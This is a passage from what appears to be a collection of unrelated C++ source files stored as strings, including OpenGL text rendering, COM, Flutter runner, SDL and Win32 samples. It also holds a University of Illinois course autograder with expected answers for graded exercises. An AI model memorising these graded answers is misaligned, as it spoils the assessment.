is not a string literal            // passing non-literal to vsnformat(). yes, user passing incorrect format strings can crash the code.\n#pragma clang diagnostic ignored \"-Wsign-conversion\"                // warning: implicit conversion changes signedness\n#pragma clang diagnostic ignored \"-Wzero-as-null-pointer-constant\"  // warning: zero as null pointer constant                    // some standard header variations use #define NULL 0\n#pragma clang diagnostic ignored \"-Wdouble-promotion\"               // warning: implicit conversion from 'float' to 'double' when passing argument to function  // using printf() is a misery with this as C++ va_arg ellipsis changes float to double.\n#pragma clang diagnostic ignored \"-Wenum-enum-conversion\"           // warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_')\n#pragma clang diagnostic ignored \"-Wdeprecated-enum-enum-conversion\"// warning: bitwise operation between different enumeration types ('XXXFlags_' and 'XXXFlagsPrivate_') is deprecated\n#pragma clang diagnostic ignored \"-Wimplicit-int-float-conversion\"  // warning: implicit conversion from 'xxx' to 'float' may lose precision\n#elif defined(__GNUC__)\n#pragma GCC diagnostic ignored \"-Wpragmas\"                          // warning: unknown option after '#pragma GCC diagnostic' kind\n#pragma GCC diagnostic ignored \"-Wformat-nonliteral\"                // warning: format not a string literal, format string not checked\n#pragma GCC diagnostic ignored \"-Wclass-memaccess\"  ",
    "#include <iostream>\n// #include <ft2build.h>\n#include \"freetype.h\"\n#include FT_FREETYPE_H\n\n#include <GL/gl.h>  // Include OpenGL headers\n#include <GL/glext.h>\n#include <GL/glcorearb.h>\n#include <GLES3/gl32.h>\n\nGLuint shader;      // Declare shader variable\nGLuint VAO;         // Declare VAO variable\n\n// Initialize FreeType library and load font\nFT_Library ft;\nFT_Face face;\n\nvoid initFreeType(const char* fontPath) {\n    \n    // Initialize FreeType\n    if (FT_Init_FreeType(&ft)) {\n        std::cerr << \"Failed to initialize FreeType\" << std::endl;\n        // Handle error\n    }\n\n    // Load font face\n    if (FT_New_Face(ft, fontPath, 0, &face)) {\n        std::cerr << \"Failed to load font\" << std::endl;\n        // Handle error\n    }\n\n    // Set font size\n    FT_Set_Pixel_Sizes(face, 0, 48); // Set font size (width, height)\n}\n\nvoid renderText(FT_Face face, const char* text, float x, float y, float scale, float r, float g, float b) {\n    // Activate corresponding render state\n    glUseProgram(shader);\n    glUniform3f(glGetUniformLocation(shader, \"textColor\"), r, g, b); // Use the passed color components\n    glBindVertexArray(VAO);  // Bind VAO\n\n    // Iterate through all characters\n    const char* p;\n    for (p = text; *p; p++) {\n        if (FT_Load_Char(face, *p, FT_LOAD_RENDER)) {\n            std::cerr << \"Failed to load Glyph\" << std::endl;\n            continue;\n        }\n\n        // Generate texture\n        GLuint texture;\n        glGenTextures(1, &texture);\n        glBindTexture(GL_TEXTURE_2D, texture);\n        glTexImage2D(\n            GL_TEXTURE_2D,\n            0,\n            GL_RED,\n            face->glyph->bitmap.width,\n            face->glyph->bitmap.rows,\n            0,\n            GL_RED,\n            GL_UNSIGNED_BYTE,\n            face->glyph->bitmap.buffer\n        );\n\n        // Set texture options\n        glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_CLAMP_TO_EDGE);\n        glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_CLAMP_TO_EDGE);\n        glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\n        glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n\n        // Now advance cursors for next glyph (note that advance is number of 1/64 pixels)\n        x += (face->glyph->advance.x >> 6) * scale; // Bitshift by 6 to get value in pixels (2^6 = 64)\n    }\n\n    glBindVertexArray(0); // Unbind VAO\n    glBindTexture(GL_TEXTURE_2D, 0); // Unbind texture\n}",
    "//Input: s = \"abc\", t = \"bac\"\n//\n//Output: 2\n//\n//Explanation:\n//\n//For s = \"abc\" and t = \"bac\", the permutation difference of s and t is equal to the sum of:\n//\n//The absolute difference between the index of the occurrence of \"a\" in s and the index of the occurrence of \"a\" in t.\n//The absolute difference between the index of the occurrence of \"b\" in s and the index of the occurrence of \"b\" in t.\n//The absolute difference between the index of the occurrence of \"c\" in s and the index of the occurrence of \"c\" in t.\n//That is, the permutation difference between s and t is equal to |0 - 1| + |2 - 2| + |1 - 0| = 2.\n\n#include <iostream>\n\nint permutationDiffOfString(const std::string& s, const std::string& t) {\n    int result = 0;\n    for (int i = 0; i < s.length(); i += 1) {\n        for (int j = 0 ; j < t.length(); j += 1) {\n            if (s[i] == t[j]) {\n                result += std::abs(i - j);\n                break;\n            }\n        }\n    }\n    return result;\n}\n\nint main() {\n    std::string s = \"abcde\";\n    std::string t = \"edbac\";\n    int diff = permutationDiffOfString(s, t);\n    std::cout << \"Permutation Difference of \" << s << \" and \" << t << \" = \" << diff;\n}",
    "#include <iostream>\r\n#include <objbase.h>\r\n\r\ninterface IX : IUnknown {\r\n    virtual void MethodX() = 0;\r\n};\r\n\r\ninterface IY : IUnknown {\r\n    virtual void MethodY() = 0;\r\n};\r\n\r\ninterface IZ : IUnknown {\r\n    virtual void MethodZ() = 0;\r\n};\r\n\r\nclass CA : public IX, public IY {\r\npublic:\r\n    STDMETHOD(QueryInterface)(REFIID riid, void** ppvObject) {\r\n        if (riid == IID_IUnknown) {\r\n            *ppvObject = static_cast<IUnknown*>(this);\r\n        }\r\n        else if (riid == IID_IX) {\r\n            *ppvObject = static_cast<IX*>(this);\r\n        }\r\n        else if (riid == IID_IY) {\r\n            *ppvObject = static_cast<IY*>(this);\r\n        }\r\n        else {\r\n            *ppvObject = NULL;\r\n            return E_NOINTERFACE;\r\n        }\r\n\r\n        static_cast<IUnknown*>(*ppvObject)->AddRef();\r\n        return S_OK;\r\n    }\r\n\r\n    STDMETHOD_(ULONG, AddRef)() {\r\n        return ++m_RefCount;\r\n    }\r\n\r\n    STDMETHOD_(ULONG, Release)() {\r\n        if (--m_RefCount == 0) {\r\n            delete this;\r\n            return 0;\r\n        }\r\n        return m_RefCount;\r\n    }\r\n\r\n    void MethodX() override {\r\n        std::cout << \"MethodX called.\" << std::endl;\r\n    }\r\n\r\n    void MethodY() override {\r\n        std::cout << \"MethodY called.\" << std::endl;\r\n    }\r\n\r\nprivate:\r\n    ULONG m_RefCount = 1;\r\n};\r\n\r\nIUnknown* CreateInstance() {\r\n    CA* pCA = new CA();\r\n    return static_cast<IUnknown*>(pCA);\r\n}\r\n\r\nint main() {\r\n    CoInitialize(NULL);\r\n\r\n    IUnknown* pIUnknown = CreateInstance();\r\n    if (pIUnknown == nullptr) {\r\n        std::cerr << \"Failed to create instance.\" << std::endl;\r\n        CoUninitialize();\r\n        return 1;\r\n    }\r\n\r\n    IX* pIX = NULL;\r\n    if (SUCCEEDED(pIUnknown->QueryInterface(IID_IX, reinterpret_cast<void**>(&pIX)))) {\r\n        pIX->MethodX();\r\n        pIX->Release();\r\n    }\r\n\r\n    IY* pIY = NULL;\r\n    if (SUCCEEDED(pIUnknown->QueryInterface(IID_IY, reinterpret_cast<void**>(&pIY)))) {\r\n        pIY->MethodY();\r\n        pIY->Release();\r\n    }\r\n\r\n    IZ* pIZ = NULL;\r\n    if (FAILED(pIUnknown->QueryInterface(IID_IZ, reinterpret_cast<void**>(&pIZ)))) {\r\n        std::cout << \"Component does not support IZ interface.\" << std::endl;\r\n    }\r\n\r\n    pIUnknown->Release();\r\n    CoUninitialize();\r\n\r\n    return 0;\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"business_card\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "\ufeff#include <iostream>\n#include <string>\nusing namespace std;\n\nclass Stack \n{\nprivate:\n    char* stackArray;\n    int top;\n    int capacity;\n\npublic:\n    Stack(int size) \n    {\n        stackArray = new char[size];\n        top = -1;\n        capacity = size;\n    }\n\n    ~Stack() \n    {\n        delete[] stackArray;\n    }\n\n    bool isEmpty() const \n    {\n        return top == -1;\n    }\n\n    void push(char ch) \n    {\n        if (top < capacity - 1) \n        {\n            stackArray[++top] = ch;\n        }\n    }\n\n    char pop() \n    {\n        if (top >= 0) \n        {\n            return stackArray[top--];\n        }\n        return '\\0';\n    }\n\n    char peek() const \n    {\n        if (top >= 0) \n        {\n            return stackArray[top];\n        }\n        return '\\0';\n    }\n};\n\nint main() \n{\n    string input;\n    cout << \"Enter a string: \";\n    getline(cin, input);\n\n    Stack stack(input.size());\n    size_t errorIndex = input.size();\n    bool isBalanced = true;\n\n    for (size_t i = 0; i < input.size(); ++i) \n    {\n        char ch = input[i];\n\n        if (ch == '(' || ch == '[' || ch == '{') \n        {\n            stack.push(ch);\n        }\n        else if (ch == ')' || ch == ']' || ch == '}') \n        {\n            if (stack.isEmpty()) \n            {\n                isBalanced = false;\n                errorIndex = i;\n                break;\n            }\n            else \n            {\n                char top = stack.peek();\n                if ((ch == ')' && top != '(') ||\n                    (ch == ']' && top != '[') ||\n                    (ch == '}' && top != '{')) {\n                    isBalanced = false;\n                    errorIndex = i;\n                    break;\n                }\n                stack.pop();\n            }\n        }\n        else if (ch == ';') \n        {\n            break;\n        }\n    }\n\n    if (isBalanced && stack.isEmpty()) \n    {\n        cout << \"The string is correct.\" << endl;\n    }\n    else \n    {\n        if (errorIndex < input.size()) \n        {\n            cout << \"Incorrect string up to the first error: \" << input.substr(0, errorIndex + 1) << endl;\n        }\n        else \n        {\n            cout << \"Incorrect string: not all brackets are balanced\" << endl;\n        }\n    }\n}\n\n",
    "\r\n// University of Illinois CS 400, MOOC 3, Week 1: Unordered Map\r\n// Author: Eric Huber, University of Illinois staff\r\n// Autograder based on Zephyr test runner by Prof. Wade Fagen-Ulmschneider and the CS 225 Course Staff\r\n// Based on Catch2 unit testing framework\r\n\r\n#include <cstdlib>\r\n#include <stdexcept>\r\n#include <sstream>\r\n#include <chrono>\r\n\r\n#include \"../uiuc/catch/catch.hpp\"\r\n\r\n#include \"../UnorderedMapCommon.h\"\r\n\r\n// May be useful in writing some tests\r\ntemplate <typename T>\r\nvoid assertPtr(T* ptr) {\r\n  if (!ptr) {\r\n    throw std::runtime_error(\"Would have dereferenced a null pointer\");\r\n  }\r\n}\r\n\r\ntemplate <typename T>\r\nT& deref(T* ptr) {\r\n  if (!ptr) {\r\n    throw std::runtime_error(\"Would have dereferenced a null pointer\");\r\n  }\r\n  else {\r\n    return *ptr;\r\n  }\r\n}\r\n\r\n// ========================================================================\r\n// Tests: makeWordCounts\r\n// ========================================================================\r\n\r\nTEST_CASE(\"Testing makeWordCounts:\", \"[weight=1]\") {\r\n\r\n  constexpr int MIN_WORD_LENGTH = 5;\r\n  StringVec bookstrings = loadBookStrings(MIN_WORD_LENGTH);\r\n  StringIntMap wordcount_map = makeWordCounts(bookstrings);\r\n\r\n  SECTION(\"Checking that map contains the right number of keys\") {\r\n    const int number_of_keys = wordcount_map.size();\r\n    const int number_of_keys_expected = 2181;\r\n    REQUIRE(number_of_keys == number_of_keys_expected);\r\n  }\r\n\r\n  SECTION(\"Checking that \\\"bandersnatch\\\" was counted 3 times\") {\r\n    bool found_bandersnatch = wordcount_map.count(\"bandersnatch\");\r\n    if (found_bandersnatch) {\r\n      const int bandersnatch_count = wordcount_map[\"bandersnatch\"];\r\n      const int bandersnatch_count_expected = 3;\r\n      REQUIRE(bandersnatch_count == bandersnatch_count_expected);\r\n    }\r\n    else {\r\n      REQUIRE(found_bandersnatch);\r\n    }\r\n  }\r\n\r\n  SECTION(\"Checking that \\\"alice\\\" was recorded 434 times\") {\r\n    bool found_alice = wordcount_map.count(\"alice\");\r\n    if (found_alice) {\r\n      const int alice_count = wordcount_map[\"alice\"];\r\n      const int alice_count_expected = 434;\r\n      REQUIRE(alice_count == alice_count_expected);\r\n    }\r\n    else {\r\n      REQUIRE(found_alice);\r\n    }\r\n  }\r\n\r\n  SECTION(\"Checking that \\\"frabjous\\\" was recorded 1 time\") {\r\n    bool found_frabjous = wordcount_map.count(\"frabjous\");\r\n    if (found_frabjous) {\r\n      const int frabjous_count = wordcount_map[\"frabjous\"];\r\n      const int frabjous_count_expected = 1;\r\n      REQUIRE(frabjous_count == frabjous_count_expected);\r\n    }\r\n    else {\r\n      REQUIRE(found_frabjous);\r\n    }\r\n  }\r\n\r\n}\r\n\r\n// ========================================================================\r\n// Tests: lookupWithFallback (with no dependency on makeWordCounts)\r\n// ========================================================================\r\n\r\nTEST_CASE(\"Testing lookupWithFallback: When the key exists\", \"[weight=1]\") {\r\n\r\n  StringIntMap wordcount_map;\r\n  wordcount_map[\"bandersnatch\"] = 3;\r\n\r\n  SECTION(\"Should return the found value\") {\r\n    const int bandersnatch_count = lookupWithFallback(wordcount_map, \"bandersnatch\", 0);\r\n    const int bandersnatch_count_expected = 3;\r\n    REQUIRE(bandersnatch_count == bandersnatch_count_expected);\r\n  }\r\n\r\n  SECTION(\"Map should not be changed by lookup\") {\r\n    auto wordcount_map_backup = wordcount_map;\r\n    const int bandersnatch_count = lookupWithFallback(wordcount_map, \"bandersnatch\", 0);\r\n    REQUIRE(wordcount_map == wordcount_map_backup);\r\n  }\r\n\r\n}\r\n\r\nTEST_CASE(\"Testing lookupWithFallback: When the key doesn't exist\", \"[weight=1]\") {\r\n\r\n  StringIntMap wordcount_map;\r\n\r\n  SECTION(\"Should return the fallback value when key not found\") {\r\n    const int not_found_result = lookupWithFallback(wordcount_map, \"cheshire\", -7);\r\n    const int not_found_result_expected = -7;\r\n    REQUIRE(not_found_result == not_found_result_expected);\r\n  }\r\n\r\n  SECTION(\"Map should not be changed by lookup\") {\r\n    auto wordcount_map_backup = wordcount_map;\r\n    const int cheshire_count = lookupWithFallback(wordcount_map, \"cheshire\", -7);\r\n    REQUIRE(wordcount_map == wordcount_map_backup);\r\n  }\r\n\r\n}\r\n\r\n// ========================================================================\r\n// Tests: memoizedLongestPalindromeLength\r\n// ========================================================================\r\n\r\nTEST_CASE(\"Testing memoizedLongestPalindromeLength: Should return correct length\", \"[weight=1]\") {\r\n\r\n  SECTION(\"Should return correct length\") {\r\n    LengthMemo memo;\r\n    const std::string str_small = \"abbbcdeeeefgABCBAz\";\r\n    const double max_duration = 10000.0; // 10 seconds\r\n    const auto start_time = getTimeNow();\r\n    const auto str = str_small;\r\n    const int pal_result = memoizedLongestPalindromeLength(memo, str, 0, str.length()-1, start_time, max_duration);\r\n    const int pal_result_expected = 5;\r\n    const bool returned_correct_length = (pal_result == 5);\r\n    REQUIRE(pal_result == pal_result_expected);\r\n  }\r\n\r\n}\r\n\r\nTEST_CASE(\"Testing memoizedLongestPalindromeLength: Memo",
    "#include \"Color.h\"\n\nvoid Color::SetRenderColor(SDL_Renderer* renderer, Colors color)\n{\n\tswitch(color)\n\t{\n\t\tcase Colors::None:\n\t\t\tbreak;\n\t\tcase Colors::Black:\n\t\t\tSDL_SetRenderDrawColor(renderer, 0, 0, 0, 255);\n\t\t\tbreak;\n\t\tcase Colors::Green:\n\t\t\tSDL_SetRenderDrawColor(renderer, 0, 128, 0, 255);\n\t\t\tbreak;\n\t\tcase Colors::Blue:\n\t\t\tSDL_SetRenderDrawColor(renderer, 123, 104, 238, 255);\n\t\t\tbreak;\n\t\tcase Colors::Red:\n\t\t\tSDL_SetRenderDrawColor(renderer, 128, 0, 0, 255);\n\t\t\tbreak;\n\t\tcase Colors::Cyan:\n\t\t\tSDL_SetRenderDrawColor(renderer, 0, 128, 128, 255);\n\t\t\tbreak;\n\t\tcase Colors::Yellow:\n\t\t\tSDL_SetRenderDrawColor(renderer, 128, 128, 0, 255);\n\t\t\tbreak;\n\t\tcase Colors::Magenta:\n\t\t\tSDL_SetRenderDrawColor(renderer, 128, 0, 128, 255);\n\t\t\tbreak;\n\t\tcase Colors::White:\n\t\t\tSDL_SetRenderDrawColor(renderer, 255, 255, 255, 255);\n\t\t\tbreak;\n\t\tcase Colors::Grey:\n\t\t\tSDL_SetRenderDrawColor(renderer, 128, 128, 128, 255);\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tbreak;\n\t}\n}\n\nSDL_Color Color::ToSDL_Color(Colors color)\n{\n\tswitch(color)\n\t{\n\t\tcase Colors::None:\n\t\t\treturn SDL_Color();\n\t\tcase Colors::Black:\n\t\t\treturn SDL_Color(0, 0, 0);\n\t\tcase Colors::Green:\n\t\t\treturn SDL_Color(0, 128, 0);\n\t\tcase Colors::Blue:\n\t\t\treturn SDL_Color(123, 104, 238);\n\t\tcase Colors::Red:\n\t\t\treturn SDL_Color(128, 0, 0);\n\t\tcase Colors::Cyan:\n\t\t\treturn SDL_Color(0, 128, 128);\n\t\tcase Colors::Yellow:\n\t\t\treturn SDL_Color(128, 128, 0);\n\t\tcase Colors::Magenta:\n\t\t\treturn SDL_Color(128, 0, 128);\n\t\tcase Colors::White:\n\t\t\treturn SDL_Color(255, 255, 255);\n\t\tcase Colors::Grey:\n\t\t\treturn SDL_Color(128, 128, 128);\n\t\tdefault:\n\t\t\treturn SDL_Color();\n\t}\n}\n",
    "#include <windows.h>\r\n#include <string>\r\n\r\n//#define IDI_MYICON 901\r\n#define ID_BUTTON_CLOSE 101\r\n#define ID_BUTTON_SETTINGS 102\r\n#define ID_BUTTON_ALERTE 103\r\n#define ID_EDIT_STOP 104\r\n#define ID_EDIT_HOUR 201\r\n#define ID_EDIT_MINUTE 202\r\n#define ID_EDIT_CHOIX 203\r\n#define ID_EDIT_HOURS 301\r\n#define ID_EDIT_MINUTES 302\r\n#define ID_EDIT_HOURS_MINUTES_SEND 303\r\n#define ID_EDIT_SAISIE 304\r\n// Convertit un nombre en cha\u00eene de caract\u00e8res wide string\r\nstd::wstring to_wstring(int number) {\r\n    return std::to_wstring(number);\r\n}\r\n\r\nSYSTEMTIME chosenTime; // Variable globale pour stocker l'heure choisie\r\nCOLORREF chosenColor; // Variable globale pour stocker la couleur choisie\r\n\r\nbool saisie_State = false;\r\nint Savebox_w, Savebox_h, Savebox_x, Savebox_y, New_w, New_h, New_x, New_y;\r\n// ici alerte AlerteActive(); permet de desactiver l'alerte et de vider les champs heure et minute\r\n// si l'alerte est activ\u00e9e alors il fautra appuyer sur le bouton point pour la desactiver.\r\n// si l'alerte est active alors la couleure de fond de passe par toutes les couleur de fa\u00e7on cyclique.\r\nbool isAlerteActive = false;\r\n\r\nHWND hwndMain;\r\n\r\nenum { COLOR_BLUE, COLOR_RED, COLOR_GREEN, COLOR_YELLOW, COLOR_PURPLE, COLOR_ORANGE };\r\nCOLORREF colors[] = { RGB(0, 0, 255), RGB(255, 0, 0), RGB(0, 255, 0), RGB(255, 255, 0), RGB(128, 0, 128), RGB(255, 165, 0) };\r\n\r\nDWORD WINAPI BackgroundThreadFunc(LPVOID lpParam);\r\nLRESULT CALLBACK WindowProcedure(HWND, UINT, WPARAM, LPARAM);\r\nvoid ShowSettingsDialog(HWND hwndParent);\r\nvoid InitializeGlobals();\r\nvoid SimulateTimeSelection();\r\nvoid SimulateColorSelection();\r\nvoid SetSaveNewvalue(HWND hwnd);\r\n//inventaire index\r\n//void  AlerteActive() {};\r\n//void ChangeBackgroundColor(HWND hwnd, COLORREF color) {}\r\n\r\nint WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\r\n    InitializeGlobals();\r\n\r\n    MSG messages;\r\n    WNDCLASS wc = { 0 };\r\n\r\n\r\n    wc.hInstance = hInstance;\r\n    wc.lpszClassName = L\"MainClass\";\r\n    wc.lpfnWndProc = WindowProcedure;\r\n    wc.style = CS_DBLCLKS;\r\n    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);\r\n    wc.hCursor = LoadCursor(NULL, IDC_ARROW);\r\n    wc.lpszMenuName = NULL;\r\n    wc.cbClsExtra = 0;\r\n    wc.cbWndExtra = 0;\r\n    wc.hbrBackground = (HBRUSH)COLOR_BACKGROUND;\r\n\r\n    if (!RegisterClass(&wc)) return 0;\r\n\r\n    hwndMain = CreateWindowExW(WS_EX_LAYERED | WS_EX_TOPMOST, L\"MainClass\", L\"FabAlarme\", WS_POPUP | WS_VISIBLE | WS_THICKFRAME, CW_USEDEFAULT, CW_USEDEFAULT, 85, 70, HWND_DESKTOP, NULL, hInstance, NULL);\r\n    SetLayeredWindowAttributes(hwndMain, 0, (255 * 75) / 100, LWA_ALPHA);\r\n\r\n    CreateWindow(L\"BUTTON\", L\"X\", WS_VISIBLE | WS_CHILD, 45, 10, 20, 20, hwndMain, (HMENU)ID_BUTTON_CLOSE, hInstance, NULL);\r\n    CreateWindow(L\"BUTTON\", L\"O\", WS_VISIBLE | WS_CHILD, 5, 10, 20, 20, hwndMain, (HMENU)ID_BUTTON_SETTINGS, hInstance, NULL);\r\n    CreateWindow(L\"BUTTON\", L\".\", WS_VISIBLE | WS_CHILD, 25, 20, 20, 20, hwndMain, (HMENU)ID_BUTTON_ALERTE, hInstance, NULL);\r\n    // Cr\u00e9ation des champs de saisie pour l'heure et les minutes\r\n    HWND hwndHourEdit = CreateWindow(L\"EDIT\", L\"23\", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER, 15, 50, 40, 20, hwndMain, (HMENU)ID_EDIT_HOUR, NULL, NULL);\r\n    HWND hwndMinuteEdit = CreateWindow(L\"EDIT\", L\"59\", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER, 70, 50, 40, 20, hwndMain, (HMENU)ID_EDIT_MINUTE, NULL, NULL);\r\n    HWND hwndsStopEdit = CreateWindow(L\"EDIT\", L\"<--- Stoper l'alarme!\", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER, 140, 20, 140, 20, hwndMain, (HMENU)ID_EDIT_STOP, NULL, NULL);\r\n    HWND hwndsChoixEdit = CreateWindow(L\"EDIT\", L\"<--- Alarme choisie.\", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER, 140, 50, 140, 20, hwndMain, (HMENU)ID_EDIT_CHOIX, NULL, 